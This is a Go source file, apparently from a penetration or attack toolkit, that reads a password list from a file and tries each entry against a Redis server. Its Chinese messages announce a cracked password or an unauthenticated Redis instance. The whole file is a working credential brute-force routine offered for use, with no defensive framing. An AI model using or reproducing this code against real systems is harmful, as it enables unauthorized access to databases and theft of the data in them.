package pkg

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"
)

var (
	data []string
	wg   sync.WaitGroup
)

// 爆破密码
func brutePWD() {

	ch := make(chan struct{}, 1)
	for _, v := range data {

		wg.Add(1)
		ch <- struct{}{}
		go func() {
			defer wg.Done()
			err := RedisClient(v)
			if err == nil {
				Info("成功爆破到 Redis 密码：" + v)
				os.Exit(0)
			} else if strings.Contains(err.Error(), "ERR Client sent AUTH, but no password is set") {
				Info("存在未授权 Redis , 不需要输入密码")
				os.Exit(0)
			} else {
				Err(err)
			}
			<-ch
		}()
	}

	wg.Wait()
	Info("未发现 Redis 密码")

}

// 读取文件
func readPass(file string) {
	f, err := os.Open(file)
	if err != nil {
		Err(err)
		os.Exit(0)
	}
	defer f.Close()

	r := bufio.NewReader(f)
	for {
		var i string
		line, err := r.ReadString('\n')
		i = strings.Replace(line, "\r\n", "", -1)
		if err == io.EOF {
			data = append(data, i)
			return
		}
		if err != nil {
			fmt.Println(err)
		}
		data = append(data, i)
	}
}
